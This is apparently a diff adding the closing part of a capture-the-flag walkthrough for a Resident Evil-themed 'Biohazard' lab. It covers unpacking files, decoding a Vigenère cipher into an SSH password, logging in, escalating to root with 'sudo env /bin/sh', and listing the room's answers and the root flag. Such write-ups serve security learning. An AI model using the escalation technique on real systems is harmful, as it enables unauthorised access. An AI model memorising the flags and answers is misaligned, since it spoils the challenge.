@@ -464,3 +464,237 @@ enter helmet flag then download
 └─$ ls
 001-key.jpg  003-key.jpg  helmet_key.txt.gpg  key-003.txt
 002-key.jpg  doom.tar.gz  important.txt
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/biohazard]
+└─$ mkdir doom
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/biohazard]
+└─$ mv doom.tar.gz doom
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/biohazard]
+└─$ cd doom
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/biohazard/doom]
+└─$ ls
+doom.tar.gz
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/biohazard/doom]
+└─$ tar -xf doom.tar.gz
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/biohazard/doom]
+└─$ ls
+doom.tar.gz  eagle_medal.txt
+```
+```text
+┌──(kali㉿kali)-[~/Downloads/biohazard/doom]
+└─$ cat eagle_medal.txt 
+SSH user: umbrella_guest
+```
+*umbrella_guest*
+hidden_Closet
+![[Pasted image 20220917221043.png]]
+What is the SSH login password
+*T_virus_rules*
+Who the STARS bravo team leader
+*Enrico*
+### Underground laboratory
+Time for the final showdown. Can you escape the nightmare?
+https://www.guballa.de/vigenere-solver
+wpbwbxr wpkzg pltwnhro, txrks_xfqsxrd_bvv_fy_rvmexa_ajk
+weasker login password, stars_members_are_my_guinea_pig
+
+## Privilege Escalation
+```text
+┌──(kali㉿kali)-[~/Downloads/biohazard/doom]
+└─$ ssh weasker@10.10.128.211      
+The authenticity of host '10.10.128.211 (10.10.128.211)' can't be established.
+ED25519 key fingerprint is SHA256:dOQYq6o72K3z+Nn6HtAR4ZFXoEZklDafT3VuF728yWc.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.128.211' (ED25519) to the list of known hosts.
+weasker@10.10.128.211's password: 
+Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-20-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+320 packages can be updated.
+58 updates are security updates.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+weasker@umbrella_corp:~$ ls
+Desktop  weasker_note.txt
+weasker@umbrella_corp:~$ cat weasker_note.txt 
+Weaker: Finally, you are here, Jill.
+Jill: Weasker! stop it, You are destroying the  mankind.
+Weasker: Destroying the mankind? How about creating a 'new' mankind. A world, only the strong can survive.
+Jill: This is insane.
+Weasker: Let me show you the ultimate lifeform, the Tyrant.
+
+(Tyrant jump out and kill Weasker instantly)
+(Jill able to stun the tyrant will a few powerful magnum round)
+
+Alarm: Warning! warning! Self-detruct sequence has been activated. All personal, please evacuate immediately. (Repeat)
+Jill: Poor bastard
+
+weasker@umbrella_corp:~$ ls -lah
+total 80K
+drwxr-xr-x  9 weasker weasker 4.0K Sep 20  2019 .
+drwxr-xr-x  5 root    root    4.0K Sep 20  2019 ..
+-rw-------  1 weasker weasker   18 Sep 20  2019 .bash_history
+-rw-r--r--  1 weasker weasker  220 Sep 18  2019 .bash_logout
+-rw-r--r--  1 weasker weasker 3.7K Sep 18  2019 .bashrc
+drwxrwxr-x 10 weasker weasker 4.0K Sep 17 20:18 .cache
+drwxr-xr-x 11 weasker weasker 4.0K Sep 20  2019 .config
+drwxr-xr-x  2 weasker weasker 4.0K Sep 19  2019 Desktop
+drwx------  3 weasker weasker 4.0K Sep 19  2019 .gnupg
+-rw-------  1 weasker weasker  346 Sep 20  2019 .ICEauthority
+drwxr-xr-x  3 weasker weasker 4.0K Sep 19  2019 .local
+drwx------  5 weasker weasker 4.0K Sep 19  2019 .mozilla
+-rw-r--r--  1 weasker weasker  807 Sep 18  2019 .profile
+drwx------  2 weasker weasker 4.0K Sep 19  2019 .ssh
+-rw-r--r--  1 weasker weasker    0 Sep 20  2019 .sudo_as_admin_successful
+-rw-r--r--  1 root    root     534 Sep 20  2019 weasker_note.txt
+-rw-------  1 weasker weasker  109 Sep 20  2019 .Xauthority
+-rw-------  1 weasker weasker 5.5K Sep 20  2019 .xsession-errors
+-rw-------  1 weasker weasker 6.6K Sep 20  2019 .xsession-errors.old
+weasker@umbrella_corp:~$ cd ..
+weasker@umbrella_corp:/home$ ls
+hunter  umbrella_guest  weasker
+weasker@umbrella_corp:/home$ ls -al
+total 20
+drwxr-xr-x  5 root           root     4096 Sep 20  2019 .
+drwxr-xr-x 24 root           root     4096 Sep 18  2019 ..
+drwxr-xr-x  4 hunter         hunter   4096 Sep 19  2019 hunter
+drwxr-xr-x  8 umbrella_guest umbrella 4096 Sep 20  2019 umbrella_guest
+drwxr-xr-x  9 weasker        weasker  4096 Sep 20  2019 weasker
+weasker@umbrella_corp:/home$ cd  umbrella_guest/
+weasker@umbrella_corp:/home/umbrella_guest$ ls
+weasker@umbrella_corp:/home/umbrella_guest$ ls -la
+total 64
+drwxr-xr-x  8 umbrella_guest umbrella 4096 Sep 20  2019 .
+drwxr-xr-x  5 root           root     4096 Sep 20  2019 ..
+-rw-r--r--  1 umbrella_guest umbrella  220 Sep 19  2019 .bash_logout
+-rw-r--r--  1 umbrella_guest umbrella 3771 Sep 19  2019 .bashrc
+drwxrwxr-x  6 umbrella_guest umbrella 4096 Sep 20  2019 .cache
+drwxr-xr-x 11 umbrella_guest umbrella 4096 Sep 19  2019 .config
+-rw-r--r--  1 umbrella_guest umbrella   26 Sep 19  2019 .dmrc
+drwx------  3 umbrella_guest umbrella 4096 Sep 19  2019 .gnupg
+-rw-------  1 umbrella_guest umbrella  346 Sep 19  2019 .ICEauthority
+drwxr-xr-x  2 umbrella_guest umbrella 4096 Sep 20  2019 .jailcell
+drwxr-xr-x  3 umbrella_guest umbrella 4096 Sep 19  2019 .local
+-rw-r--r--  1 umbrella_guest umbrella  807 Sep 19  2019 .profile
+drwx------  2 umbrella_guest umbrella 4096 Sep 20  2019 .ssh
+-rw-------  1 umbrella_guest umbrella  109 Sep 19  2019 .Xauthority
+-rw-------  1 umbrella_guest umbrella 7546 Sep 19  2019 .xsession-errors
+weasker@umbrella_corp:/home/umbrella_guest$ cd .jailcell/
+weasker@umbrella_corp:/home/umbrella_guest/.jailcell$ ls -la
+total 12
+drwxr-xr-x 2 umbrella_guest umbrella 4096 Sep 20  2019 .
+drwxr-xr-x 8 umbrella_guest umbrella 4096 Sep 20  2019 ..
+-rw-r--r-- 1 umbrella_guest umbrella  501 Sep 20  2019 chris.txt
+weasker@umbrella_corp:/home/umbrella_guest/.jailcell$ cat chris.txt 
+Jill: Chris, is that you?
+Chris: Jill, you finally come. I was locked in the Jail cell for a while. It seem that weasker is behind all this.
+Jil, What? Weasker? He is the traitor?
+Chris: Yes, Jill. Unfortunately, he play us like a damn fiddle.
+Jill: Let's get out of here first, I have contact brad for helicopter support.
+Chris: Thanks Jill, here, take this MO Disk 2 with you. It look like the key to decipher something.
+Jill: Alright, I will deal with him later.
+Chris: see ya.
+
+MO disk 2: albert 
+
+weasker@umbrella_corp:~$ ls -la
+total 80
+drwxr-xr-x  9 weasker weasker 4096 Sep 20  2019 .
+drwxr-xr-x  5 root    root    4096 Sep 20  2019 ..
+-rw-------  1 weasker weasker   18 Sep 20  2019 .bash_history
+-rw-r--r--  1 weasker weasker  220 Sep 18  2019 .bash_logout
+-rw-r--r--  1 weasker weasker 3771 Sep 18  2019 .bashrc
+drwxrwxr-x 10 weasker weasker 4096 Sep 17 20:18 .cache
+drwxr-xr-x 11 weasker weasker 4096 Sep 20  2019 .config
+drwxr-xr-x  2 weasker weasker 4096 Sep 19  2019 Desktop
+drwx------  3 weasker weasker 4096 Sep 19  2019 .gnupg
+-rw-------  1 weasker weasker  346 Sep 20  2019 .ICEauthority
+drwxr-xr-x  3 weasker weasker 4096 Sep 19  2019 .local
+drwx------  5 weasker weasker 4096 Sep 19  2019 .mozilla
+-rw-r--r--  1 weasker weasker  807 Sep 18  2019 .profile
+drwx------  2 weasker weasker 4096 Sep 19  2019 .ssh
+-rw-r--r--  1 weasker weasker    0 Sep 20  2019 .sudo_as_admin_successful
+-rw-r--r--  1 root    root     534 Sep 20  2019 weasker_note.txt
+-rw-------  1 weasker weasker  109 Sep 20  2019 .Xauthority
+-rw-------  1 weasker weasker 5548 Sep 20  2019 .xsession-errors
+-rw-------  1 weasker weasker 6749 Sep 20  2019 .xsession-errors.old
+weasker@umbrella_corp:~$ cat .sudo_as_admin_successful 
+weasker@umbrella_corp:~$ sudo -l
+[sudo] password for weasker: 
+Matching Defaults entries for weasker on umbrella_corp:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User weasker may run the following commands on umbrella_corp:
+    (ALL : ALL) ALL
+weasker@umbrella_corp:~$ sudo env /bin/sh
+```
+```text
+# whoami
+root
+```
+```text
+# cat /root/flag.txt 
+cat: /root/flag.txt: No such file or directory
+```
+```text
+# cd /root
+```
+```text
+# ls
+root.txt
+```
+```text
+# cat root.txt  
+In the state of emergency, Jill, Barry and Chris are reaching the helipad and awaiting for the helicopter support.
+
+Suddenly, the Tyrant jump out from nowhere. After a tough fight, brad, throw a rocket launcher on the helipad. Without thinking twice, Jill pick up the launcher and fire at the Tyrant.
+
+The Tyrant shredded into pieces and the Mansion was blowed. The survivor able to escape with the helicopter and prepare for their next fight.
+
+The End
+
+flag: 3c5794a00dc56c35f2bf096571edf3bf
+```
+Where you found Chris
+*jailcell*
+Who is the traitor
+*weasker*
+The login password for the traitor
+*stars_members_are_my_guinea_pig*
+The name of the ultimate form
+*Tyrant*
+![[Pasted image 20220917222546.png]]
+The root flag
+*3c5794a00dc56c35f2bf096571edf3bf* (gtofbins env https://gtfobins.github.io/gtfobins/env/ )
+
+## Notes / Lessons Learned
+[[Credentials Harvesting]]
+
